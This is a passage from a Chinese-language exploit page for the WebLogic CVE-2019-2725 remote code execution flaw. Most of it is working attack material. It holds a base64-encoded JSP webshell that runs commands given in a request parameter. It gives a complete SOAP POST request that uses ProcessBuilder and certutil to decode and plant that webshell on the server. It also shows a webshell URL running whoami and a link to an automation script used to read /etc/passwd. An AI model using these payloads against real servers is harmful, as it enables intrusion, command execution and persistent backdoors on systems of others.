PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4=  &gt; servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/webshell.txt&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;/array&gt;<br />&lt;void method="start"/&gt;&lt;/void&gt;<br />&lt;/work:WorkContext&gt;<br />&lt;/soapenv:Header&gt;<br />&lt;soapenv:Body&gt;<br />&lt;asy:onAsyncDelivery/&gt;<br />&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</p><p>POST /_async/AsyncResponseService HTTP/1.1<br />Host: ip:port<br />Content-Length: 913<br />Accept-Encoding: gzip, deflate<br />SOAPAction:<br />Accept: */*<br />User-Agent: Apache-HttpClient/4.1.1 (java 1.5)<br />Connection: keep-alive<br />content-type: text/xml<br /><br />&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;   <br />&lt;soapenv:Header&gt; <br />&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;<br />&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;<br />&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;<br />&lt;void class="java.lang.ProcessBuilder"&gt;<br />&lt;array class="java.lang.String" length="3"&gt;<br />&lt;void index="0"&gt;<br />&lt;string&gt;cmd&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;void index="1"&gt;<br />&lt;string&gt;/c&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;void index="2"&gt;<br />&lt;string&gt;certutil -decode servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/webshell.txt servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/webshell.jsp&lt;/string&gt;<br />&lt;/void&gt;<br />&lt;/array&gt;<br />&lt;void method="start"/&gt;&lt;/void&gt;<br />&lt;/work:WorkContext&gt;<br />&lt;/soapenv:Header&gt;<br />&lt;soapenv:Body&gt;<br />&lt;asy:onAsyncDelivery/&gt;<br />&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</p><p>这两组代码的webshell地址为：<a href="http://www.0-sec.org/bea_wls_internal/webshell.jsp?pwd=123&amp;cmd=whoami">http://www.0-sec.org/bea_wls_internal/webshell.jsp?pwd=123&amp;cmd=whoami</a></p><h3>自动化脚本</h3><p><a href="https://github.com/ianxtianxt/CVE-2019-2725">https://github.com/ianxtianxt/CVE-2019-2725</a></p><p>cve2019-2725_weblogic_rce.bat http://192.168.31.5:7001 "cat /etc/passwd"</p><h2>参考链接</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzA3NjU5MTIxMg==&amp;mid=2650560530&amp;idx=1&amp;sn=86f5e0811c003c71965a4fc088f18100&amp;chksm=87560111b02188071b9a60a36316b931770b0ed58b02b63d2d2428a5120d6809030d94031589&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzA3NjU5MTIxMg==&amp;mid=2650560530&amp;idx=1&amp;sn=86f5e0811c003c71965a4fc088f18100&amp;chksm=87560111b02188071b9a60a36316b931770b0ed58b02b63d2d2428a5120d6809030d94031589&amp;scene=21#wechat_redirect</a></p></body></html>